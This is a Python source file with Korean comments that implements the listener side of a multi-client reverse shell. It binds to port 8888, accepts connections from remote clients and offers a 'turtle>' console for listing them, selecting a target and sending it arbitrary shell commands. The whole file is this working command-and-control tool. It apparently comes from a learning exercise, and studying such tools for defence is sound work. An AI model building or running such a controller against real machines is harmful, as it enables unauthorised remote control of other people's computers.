import socket
import sys
import threading
import time
from queue import Queue

# 스레드1는 클라이언트 연결
# 스레드2는 클라이언트 접근 명령내림
NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []


# 소켓을 만들고 컴퓨터와 연결한다
def create_socket():
    try:
        global host
        global port
        global s
        host = "0.0.0.0"
        port = 8888
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error : " + str(msg))


# 연결을 위한 바인딩 & 리스닝
def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the Port : " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()

# 여러개의 클라이언트 리스트를 핸들링
# server.py파일이 재시작 되기전 이전 연결을 닫음
def accepting_connections():
    for c in all_connections:
        c.close()
    
    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1) # 타임아웃 방지
            print(address)
            all_connections.append(conn)
            all_address.append(address)

            print("Connection has been established : " + address[0])

        except:
            print("Error accepting connection")

# 스레드 기능 1) 모든클라이언트를 볼수있음 2) 클라이언트 고르기 3) 연결된 클아이언트에 명령보내기
# 상호적으로 즉시 명령 보냄
# turtle> list
def start_turtle():
    while True:
        cmd = input("turtle>")

        if cmd == 'list':
            print(list_connections())
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        elif cmd == 'quit':
            return
        else:
            print("command not recognized")


def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            k = conn.recv(201480) # 연결 확인
        except:
            del all_connections[i]
            del all_address[i]
            continue
        results += str(i) + "  " + str(all_address[i][0]) + ":" + str(all_address[i][1]) + "\n"
    
    return results

# 타겟을 고름
def get_target(cmd):
    try:
        target = cmd.replace('select ', '') # target id 가져오기
        target = int(target)
        conn = all_connections[target]
        print("You care now connected to : " + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")
        return conn
    except:
        print("Selection not valid")
        return None


# 클라이언트 CLI에 명령을 전달
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(1024), "utf-8")
                print(client_response, end="")
        except:
            print("Error sending commands")
            break

# worker 스레드 생성
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True # 스레드 보조스레드(데몬 스레드는 메인스레드가 종료되면 같이 종료된다)  ex 가비지 컬렉션, 자동갱신 등
        t.start()

# 다음 할일을 큐에 담는다 (핸들 연결, 명령 보내기)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        elif x == 2:
            start_turtle()

        queue.task_done() # task_done을 호출할때마다 join 작업 카운트가 하나씩 내려감
        print("task done!!")


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    
    queue.join() # 큐의 모든 항목을 꺼내서 처리할때까지 블록

create_workers()
create_jobs()
